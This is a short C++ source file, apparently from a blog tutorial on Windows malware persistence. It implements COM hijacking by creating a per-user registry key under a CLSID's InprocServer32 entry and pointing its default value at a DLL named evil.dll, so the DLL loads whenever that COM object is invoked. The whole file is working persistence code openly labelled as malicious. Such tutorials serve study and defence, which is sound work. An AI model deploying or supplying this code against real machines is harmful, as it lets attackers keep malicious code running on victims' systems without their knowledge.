/*
pers.cpp
windows low level persistence via COM hijacking
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html
*/
#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // subkey
  const char* sk = "Software\\Classes\\CLSID\\{A6FF50C0-56C0-71CA-5732-BED303A59628}\\InprocServer32";

  // malicious DLL
  const char* dll = "C:\\Users\\User\\Desktop\\shared\\2022-05-02-malware-pers-3\\evil.dll";

  // startup
  LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  } else {
    printf("cannot create subkey for hijacking :(\n");
    return -1;
  }
  return 0;
}
